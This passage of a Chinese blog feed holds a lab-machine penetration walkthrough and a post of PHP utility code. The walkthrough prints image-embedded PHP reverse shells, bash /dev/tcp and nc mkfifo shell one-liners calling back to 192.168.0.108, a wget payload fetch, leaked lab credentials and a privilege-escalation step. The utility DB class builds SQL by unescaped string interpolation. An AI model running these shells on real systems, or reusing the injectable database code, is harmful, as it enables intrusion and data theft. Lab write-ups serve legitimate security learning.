WAF)</span><br></pre></td></tr></table></figure></li><li><p>sql注入没有了</p></li><li><p>开始爆破目录：</p></li><li><p>输入一个没有文件的链接发现是<code>Apache/2.2.22 (Ubuntu)</code>的服务器，那么很有可能是php的代码</p></li><li><p>爆破php的路径</p></li><li><p>使用工具：Buster<code>Buster.exe -u=http://192.168.0.104/ -d=php.txt -t=5</code></p></li><li><p>扫描结果（除去了状态码为400的）：</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">200</span> OK-----http:<span class="comment">//192.168.0.104///add.php</span></span><br><span class="line"><span class="number">200</span> OK-----http:<span class="comment">//192.168.0.104///index.php</span></span><br><span class="line"><span class="number">200</span> OK-----http:<span class="comment">//192.168.0.104///head.php</span></span><br><span class="line"><span class="number">200</span> OK-----http:<span class="comment">//192.168.0.104///show.php</span></span><br><span class="line"><span class="number">200</span> OK-----http:<span class="comment">//192.168.0.104///test.php</span></span><br><span class="line"><span class="number">200</span> OK-----http:<span class="comment">//192.168.0.104///c</span></span><br><span class="line"><span class="number">200</span> OK-----http:<span class="comment">//192.168.0.104///index</span></span><br><span class="line"><span class="number">200</span> OK-----http:<span class="comment">//192.168.0.104///panel</span></span><br><span class="line"><span class="number">200</span> OK-----http:<span class="comment">//192.168.0.104///c.php</span></span><br><span class="line"><span class="number">200</span> OK-----http:<span class="comment">//192.168.0.104///in.php</span></span><br><span class="line"><span class="number">200</span> OK-----http:<span class="comment">//192.168.0.104///panel.php</span></span><br><span class="line"><span class="number">403</span> Forbidden-----http:<span class="comment">//192.168.0.104///doc/</span></span><br><span class="line"><span class="number">403</span> Forbidden-----http:<span class="comment">//192.168.0.104///cgi-bin/</span></span><br><span class="line"><span class="number">403</span> Forbidden-----http:<span class="comment">//192.168.0.104///doc/demo/demo3.php</span></span><br><span class="line"><span class="number">403</span> Forbidden-----http:<span class="comment">//192.168.0.104///doc/demo/demo5.php</span></span><br><span class="line"><span class="number">403</span> Forbidden-----http:<span class="comment">//192.168.0.104///doc/demo/database_demo.php</span></span><br><span class="line"><span class="number">403</span> Forbidden-----http:<span class="comment">//192.168.0.104///doc/demo/demo4.php</span></span><br><span class="line"><span class="number">403</span> Forbidden-----http:<span class="comment">//192.168.0.104///doc/demo/demo7.php</span></span><br><span class="line"><span class="number">403</span> Forbidden-----http:<span class="comment">//192.168.0.104///doc/demo/demo8.php</span></span><br><span class="line"><span class="number">403</span> Forbidden-----http:<span class="comment">//192.168.0.104///doc/demo/hello_world_demo.php</span></span><br><span class="line"><span class="number">403</span> Forbidden-----http:<span class="comment">//192.168.0.104///doc/demo/demo6.php</span></span><br><span class="line"><span class="number">403</span> Forbidden-----http:<span class="comment">//192.168.0.104///doc/fix_depricated.php</span></span><br><span class="line"><span class="number">403</span> Forbidden-----http:<span class="comment">//192.168.0.104///doc/reports/index.php</span></span><br><span class="line"><span class="number">403</span> Forbidden-----http:<span class="comment">//192.168.0.104///doc/demo/demo9.php</span></span><br><span class="line"><span class="number">403</span> Forbidden-----http:<span class="comment">//192.168.0.104///doc/rpm-build/header.inc.php</span></span><br><span class="line"><span class="number">403</span> Forbidden-----http:<span class="comment">//192.168.0.104///doc/rpm-build/checkout-build-archives.php</span></span><br><span class="line"><span class="number">403</span> Forbidden-----http:<span class="comment">//192.168.0.104///doc/rpm-build/post_install.php</span></span><br></pre></td></tr></table></figure><ul><li><p>逐个查看网页：发现一个test.php有这样一句话:<code>&#39;file&#39; parameter is empty. Please provide file path in &#39;file&#39; parameter</code></p><p>说是缺少一个file参数，那随便试用一个文件<code>http://192.168.0.104///test.php?file=./test.php</code></p><p>发现没反应，那就试试post请求:</p><p>发现把自己下载下来了~！竟然可以随便下载文件</p><p>那就把刚刚扫描到的那些文件都下载下来</p><p>把phpinfo里面有用的配置文件也下载下来</p><p>发现c.php是数据库连接文件<code>mysqli_connect(&quot;127.0.0.1&quot;,&quot;billu&quot;,&quot;b0x_billu&quot;,&quot;ica_lab&quot;);</code></p></li><li><p>in.php是phpinfo</p></li><li><p>找到数据库账号密码了，去找找数据库管理界面，网页是php+mysql的一般的管理工具是phpmyadmin</p></li><li><p>访问``<a href="http://192.168.0.104/phpmyadmin`发现是404" target="_blank" rel="noopener">http://192.168.0.104/phpmyadmin`发现是404</a></p></li><li><p>那会不会是改了名字呢？</p></li><li><p>去百度看看phpmyadmin常用别名</p></li><li><p>试试访问<code>http://192.168.0.104/phpmy</code>  简写</p></li><li><p>发现进去了</p></li><li><p>PHPMyadmin配置文件是<code>config.inc.php</code>或<code>config.default.php</code></p></li><li><p>去把他的配置文件下载下来看看</p></li><li><p>发现了:<code>$cfg[&#39;Servers&#39;][$i][&#39;user&#39;] = &#39;root&#39;; $cfg[&#39;Servers&#39;][$i][&#39;password&#39;] = &#39;roottoor&#39;;</code></p></li><li><p>登录之后发现转到了<code>http://192.168.0.104/panel.php</code></p></li><li><p>看看下载下来的panel.php</p></li><li><p>panel.php是一个操作用户的界面</p></li><li><p>查看代码</p></li><li><p>发现了一个文件包含漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'continue'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$dir=getcwd();</span><br><span class="line">$choice=str_replace(<span class="string">'./'</span>,<span class="string">''</span>,$_POST[<span class="string">'load'</span>]);</span><br><span class="line"><span class="keyword">if</span>($choice===<span class="string">'add'</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span>($dir.<span class="string">'/'</span>.$choice.<span class="string">'.php'</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">if</span>($choice===<span class="string">'show'</span>)&#123;</span><br><span class="line"><span class="keyword">include</span>($dir.<span class="string">'/'</span>.$choice.<span class="string">'.php'</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">include</span>($dir.<span class="string">'/'</span>.$_POST[<span class="string">'load'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>当<code>$choice!=&#39;add&#39; &amp;&amp; $choice!=&#39;show&#39;</code>的时候会包含传递的load文件（$choice）</p></li><li><p>我们先添加一个用户他可以上传头像的，阅读代码发现对只能上传图片，所以我们用图片马</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$ip=@$_POST[<span class="string">'ip'</span>];</span><br><span class="line">$port=@$_POST[<span class="string">'port'</span>];</span><br><span class="line">@system(<span class="string">"bash -i &gt;&amp; /dev/tcp/&#123;$ip&#125;/&#123;$port&#125; 0&gt;&amp;1"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>反弹shell 带ip和port的参数</p></li><li><p>利用漏洞</p></li><li><p>找到图片码的位置<code>http://192.168.0.104/uploaded_images/shell.png</code></p></li><li><p>抓包改提交的参数</p></li><li><p><code>load=uploaded_images/shell.png&amp;continue=continue&amp;ip=192.168.0.108&amp;port=1111</code></p></li><li><p>nc接受：<code>nc -lvp 1111</code></p></li><li><p>发现没反应</p></li><li><p>可能是包含之后提交的参数已经过了</p></li><li><p>换一个固定IP地址和端口的图片码</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@system(<span class="string">"bash -i &gt;&amp; /dev/tcp/192.168.0.108/6666 0&gt;&amp;1"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>nc接受：<code>nc -lvp 6666</code></p></li><li><p>然后用的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">$ip=<span class="string">'192.168.0.108'</span>;</span><br><span class="line">$port=<span class="string">'2520'</span>;</span><br><span class="line">$fp=@fsockopen($ip,$port,$errno,$errstr);</span><br><span class="line"><span class="keyword">if</span>(!$fp)&#123; <span class="keyword">echo</span> <span class="string">"error"</span>;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">fputs($fp,<span class="string">"\nconnect success\n"</span>);</span><br><span class="line"><span class="keyword">while</span> (!feof($fp)) &#123;</span><br><span class="line">fputs($fp,<span class="string">"shell:"</span>);</span><br><span class="line">$shell=fgets($fp);</span><br><span class="line">$message=`$shell`;</span><br><span class="line">fputs($fp,$message);</span><br><span class="line">&#125;</span><br><span class="line">fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>反弹了一个<code>www-data</code>的shell</p></li><li><p>而且这个shell几乎没有权限只能操作网站目录</p></li><li><p>只有uploaded_images目录可以写入文件</p></li><li><p>写了一个一句话木马就上传就开用菜刀连了</p></li><li><p>发现版本是<code>Ubuntu12.04</code>有一个<code>CVE-2015-1328</code></p></li><li><p>然后还是没办法拿提权</p></li><li><p>菜刀的终端没办法执行exp（提权的程序）</p></li><li><p>最后使用菜刀的终端去反弹了一个shell</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/lcawx; nc 192.168.0.108 4444 0&lt;/tmp/lcawx | /bin/sh &gt;/tmp/lcawx 2&gt;&amp;1; rm /tmp/lcawx</span><br></pre></td></tr></table></figure><ul><li><p>然后在反弹的shell里面执行了exp</p></li><li><p>成功拿下rootshell</p></li></ul><h2><span id="2-重要信息">2. 重要信息</span></h2><h4><span id="a数据库账号密码">a.数据库账号密码</span></h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user:billu passwd:b0x_billu dbname:ica_lab</span><br><span class="line">user:root passwd:roottoor (root密码)</span><br></pre></td></tr></table></figure><h4><span id="b网页登录密码">b.网页登录密码</span></h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user:biLLu passwd:hEx_it</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.0.108:1010/rt ./uploaded_images/r</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.0.108/1999 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/lcawx; nc 192.168.0.108 4444 0&lt;/tmp/lcawx | /bin/sh &gt;/tmp/lcawx 2&gt;&amp;1; rm /tmp/lcawx</span><br></pre></td></tr></table></figure><h2><span id="3总结">3.总结</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;up&quot;&gt;</span><br><span class="line">if($_FILES[&quot;file&quot;])</span><br><span class="line">move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],$_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#india靶机渗透&quot;&gt;india靶机渗透&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1渗透过程&quot;&gt;1.渗透过程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-重要信息&quot;&gt;2. 重要信息&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#a数据库账号密码&quot;&gt;a.数据库账号密码&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#b网页登录密码&quot;&gt;b.网页登录密码&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#3总结&quot;&gt;3.总结&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- tocstop --&gt;
    
    </summary>
    
    
      <category term="靶机渗透" scheme="https://atc96.top/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="网络渗透" scheme="https://atc96.top/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>PHP工具代码</title>
    <link href="https://atc96.top/phpCode/"/>
    <id>https://atc96.top/phpCode/</id>
    <published>2020-05-09T16:00:00.000Z</published>
    <updated>2020-05-10T11:30:13.547Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#php工具代码">PHP工具代码</a><ul><li><a href="#1-php文件上传错误检测">1. php文件上传错误检测</a></li><li><a href="#2php-base64编码">2.PHP base64编码</a></li><li><a href="#3php数据库简单包装类">3.PHP数据库简单包装类</a></li></ul></li></ul><!-- tocstop --><a id="more"></a><h1><span id="php工具代码">PHP工具代码</span></h1><h2><span id="1-php文件上传错误检测">1. php文件上传错误检测</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_error</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ($file[<span class="string">'error'</span>] &gt; <span class="number">0</span>) &#123;   </span><br><span class="line">    <span class="keyword">switch</span> ($file[<span class="string">'error'</span>])  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:  </span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">'上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值'</span>);  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:  </span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">'上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值'</span>);  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:  </span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">'文件只有部分被上传'</span>);  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>: </span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">'没有文件被上传'</span>);  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:  </span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">'上传文件大小为0'</span>);  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="2php-base64编码">2.PHP base64编码</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base64Code</span><span class="params">($str,$isEncode=false)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//true编码 false解码</span></span><br><span class="line">    <span class="keyword">return</span> $isEncode ? rawurldecode(base64_decode($str)): rawurlencode(base64_encode($str));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="3php数据库简单包装类">3.PHP数据库简单包装类</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 数据库管理类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DBManager</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> $m_conn;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;m_conn = <span class="keyword">new</span> mysqli(<span class="string">'localhost'</span>,<span class="string">'username'</span>,<span class="string">'password'</span>,<span class="string">'databaseName'</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;m_conn-&gt;connect_error) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;m_conn-&gt;close();</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"数据库连接失败: "</span> . <span class="keyword">$this</span>-&gt;m_conn-&gt;connect_error);</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//查询</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($tab, $cols=<span class="string">'*'</span>,$where=<span class="string">'1'</span>,$ext=<span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$sql = <span class="string">"select &#123;$cols&#125; from &#123;$tab&#125; where &#123;$where&#125; &#123;$ext&#125;"</span>;</span><br><span class="line">$result = <span class="keyword">$this</span>-&gt;m_conn-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>(!$result) <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;m_conn-&gt;error;</span><br><span class="line"><span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">        $data[$i] = $row;</span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//插入</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($tab, $vals, $cols=<span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$sql = <span class="string">"insert into &#123;$tab&#125; (&#123;$cols&#125;) values(&#123;$vals&#125;)"</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;m_conn-&gt;query($sql))</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;m_conn-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//更新</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($tab,$col,$val,$where=<span class="string">'1'</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$sql = <span class="string">"update &#123;$tab&#125; set &#123;$col&#125; = '&#123;$val&#125;' where &#123;$where&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;m_conn-&gt;query($sql))</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;m_conn-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//删除</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delete</span><span class="params">($tab,$where)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$sql = <span class="string">"delete from &#123;$tab&#125; where &#123;$where&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;m_conn-&gt;query($sql))</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;m_conn-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//清空表</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clear</span><span class="params">($tab)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$sql = <span class="string">"truncate table &#123;$tab&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;m_conn-&gt;query($sql))</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;m_conn-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//联合查询</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">join_select</span><span class="params">($user,$cols=<span class="string">'*'</span>,$on=<span class="string">'1'</span>, $start=<span class="number">0</span>, $num =<span class="number">10000</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$sql = <span class="string">"SELECT &#123;$cols&#125; FROM `fileinfo` JOIN `userinfo` ON fileinfo.uid = userinfo.uid AND (fshare='1' OR uname='&#123;$user&#125;') AND &#123;$on&#125; LIMIT &#123;$start&#125;,&#123;$num&#125;;"</span>;</span><br><span class="line">$result = <span class="keyword">$this</span>-&gt;m_conn-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>(!$result) <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;m_conn-&gt;error;</span><br><span class="line"><span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">$i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">$data[$i] = $row;</span><br><span class="line">$i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//数量查询</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">count</span><span class="params">($tab,$where=<span class="string">'1'</span>,$join = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>($join)</span><br><span class="line">$res =  <span class="keyword">$this</span>-&gt;join_select(<span class="string">'count(*)'</span>,$where);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">$res =  <span class="keyword">$this</span>-&gt;select(<span class="string">"&#123;$tab&#125;"</span>,<span class="string">'count(*)'</span>,$where);</span><br><span class="line"><span class="keyword">return</span> $res[<span class="number">0</span>][<span class="string">'count(*)'</span>];</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//关键字查询</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">keywordQuery</span><span class="params">($user,$kw,$cols=<span class="string">'*'</span>,$start = <span class="number">0</span>,$num = <span class="number">1000</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$on = <span class="string">"(fname LIKE '%&#123;$kw&#125;%' OR</span></span><br><span class="line"><span class="string"> fpath LIKE '%&#123;$kw&#125;%' OR </span></span><br><span class="line"><span class="string"> fdate LIKE '%&#123;$kw&#125;%' OR</span></span><br><span class="line"><span class="string"> foperation LIKE '%&#123;$kw&#125;%' OR</span></span><br><span class="line"><span class="string"> ftext LIKE '%&#123;$kw&#125;%' OR</span></span><br><span class="line"><span class="string"> fsuffix LIKE '%&#123;$kw&#125;%' OR</span></span><br><span class="line"><span class="string"> uname LIKE '%&#123;$kw&#125;%')"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;join_select($user,$cols,$on,$start,$num);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#php工具代码&quot;&gt;PHP工具代码&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-php文件上传错误检测&quot;&gt;1. php文件上传错误检测&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2php-base64编码&quot;&gt;2.PHP base64编码&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#3php数据库简单包装类&quot;&gt;3.PHP数据库简单包装类&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- tocstop --&gt;
    
    </summary>
    
    
      <category term="PHP" scheme="https://atc96.top/categories/PHP/"/>
    
    
      <category term="PHP" scheme="https://atc96.top/tags/PHP/"/>
    
  </entry>
  
</feed>
